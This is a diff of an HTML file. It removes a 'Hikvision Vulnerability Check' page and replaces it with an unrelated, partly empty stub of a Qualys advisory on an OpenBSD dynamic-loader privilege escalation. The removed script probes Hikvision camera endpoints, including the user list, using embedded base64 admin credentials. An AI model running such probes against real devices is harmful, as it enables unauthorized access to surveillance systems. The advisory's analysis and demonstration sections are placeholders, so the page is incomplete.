@@ -1,94 +1,40 @@
-```html
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hikvision Vulnerability Check</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-            margin: 0;
-            padding: 0;
-        }
-
-        .container {
-            max-width: 800px;
-            margin: 20px auto;
-            padding: 20px;
-            background-color: #fff;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-
-        h1 {
-            color: #333;
-            text-align: center;
-        }
-
-        .output {
-            margin-top: 20px;
-            padding: 10px;
-            background-color: #f9f9f9;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-
-        .success {
-            color: green;
-        }
-
-        .error {
-            color: red;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Qualys Security Advisory</title>
+<link rel="stylesheet" href="styles.css">
 </head>
-
 <body>
-    <div class="container">
-        <h1>Hikvision Vulnerability Check</h1>
-        <div class="output">
-            <p>Checking if <span id="url"></span> is vulnerable to Hikvision exploits...</p>
-        </div>
-    </div>
+<h1>Qualys Security Advisory</h1>
+<h2>Local Privilege Escalation in OpenBSD's dynamic loader (CVE-2019-19726)</h2>
 
-    <script>
-        const vulnerableEndpoints = {
-            hikvision_time: "/System/time?auth=YWRtaW46UEtTOHVpTWg1UUk4",
-            hikvision_users: "/Security/users?auth=YWRtaW46c28xWVBx",
-            hikvision_device: "/System/deviceInfo?auth=YWRtaW46a3ZEUE4",
-            hikvision_network_interfaces: "/Network/interfaces?auth=YWRtaW46OXduWA",
-            hikvision_storage: "/System/Storage/volumes?auth=YWRtaW46b0tSb0ZGNzl6"
-        };
+<div class="content">
+  <h3>Summary</h3>
+  <p>We discovered a Local Privilege Escalation in OpenBSD's dynamic loader (ld.so): this vulnerability is exploitable in the default installation (via the set-user-ID executable chpass or passwd) and yields full root privileges.</p>
+  <p>We developed a simple proof of concept and successfully tested it against OpenBSD 6.6 (the current release), 6.5, 6.2, and 6.1, on both amd64 and i386; other releases and architectures are probably also exploitable.</p>
+</div>
 
-        const endpointKeys = Object.keys(vulnerableEndpoints);
-        const targetUrl = "https://example.com";
-        const targetPort = 8080;
-        const outputElement = document.querySelector(".output");
+<div class="content">
+  <h3>Analysis</h3>
+  <p>In this section, we analyze a step-by-step execution of our proof of concept:</p>
+  <!-- Detailed analysis content here -->
+</div>
 
-        function checkVulnerability() {
-            outputElement.innerHTML = "<p>Checking if " + targetUrl + ":" + targetPort + " is vulnerable to Hikvision exploits...</p>";
-            
-            fetch(targetUrl + ":" + targetPort + vulnerableEndpoints['hikvision_time'])
-                .then(response => response.text())
-                .then(data => {
-                    if (data.includes("manual")) {
-                        outputElement.innerHTML += "<p class='success'>Vulnerable: " + targetUrl + ":" + targetPort + "</p>";
-                    } else {
-                        outputElement.innerHTML += "<p class='error'>Not Vulnerable: " + targetUrl + ":" + targetPort + "</p>";
-                    }
-                })
-                .catch(error => {
-                    console.error("Error:", error);
-                    outputElement.innerHTML += "<p class='error'>Error checking vulnerability</p>";
-                });
-        }
+<div class="content">
+  <h3>Demonstration</h3>
+  <p>In this section, we demonstrate the use of our proof of concept:</p>
+  <!-- Detailed demonstration content here -->
+</div>
 
-        checkVulnerability();
-    </script>
+<div class="content">
+  <h3>Acknowledgments</h3>
+  <p>We thank Theo de Raadt and the OpenBSD developers for their incredibly quick response: they published a patch for this vulnerability in less than 3 hours. We also thank MITRE's CVE Assignment Team.</p>
+</div>
+
+<footer>
+  <p>This message may contain confidential and privileged information. If it has been sent to you in error, please reply to advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read, copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us.</p>
+</footer>
 </body>
-
 </html>
-```
